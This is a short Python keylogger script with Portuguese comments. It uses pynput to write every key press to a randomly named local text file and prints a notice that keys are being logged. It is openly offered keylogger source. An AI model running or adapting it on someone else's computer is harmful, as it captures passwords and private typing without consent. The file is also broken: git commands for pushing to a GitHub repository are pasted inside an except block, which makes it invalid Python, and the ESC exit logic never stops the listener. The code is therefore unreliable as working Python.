#importando a biblioteca
from pynput.keyboard import Listener,Key
import random
import sys
#gerando nome do arquivo de log

def encerra_programa(ke):
    print('Programa encerrado')

def escreve_key(key):
    try:
        with open(f'{log}','a') as file:
            file.write(f'{str(key)}\n')
    except Exception as e:
        print(f'Erro ao escrever no arquivo: {e}')
        encerra_programa(key)


    if key == Key.esc:
        encerra_programa(key)
log = f'yek{random.randint(0,10000)}.txt'
print('As teclas estão sendo registradas... Pressione ESC para sair.')
try:
    with Listener(on_press=escreve_key) as logs:
        logs.join()
except Exception as e:
    print(f'Erro ao iniciar o listener: {e}')
finally:
    try:
        logs.stop()
        encerra_programa
    except Exception as e:
        print(f'Erro ao encerrar o programa: {e}')

        git remote add origin https://github.com/EvandroSchibilinski/KEYLOGGER
        git branch -M main
        git push -u origin main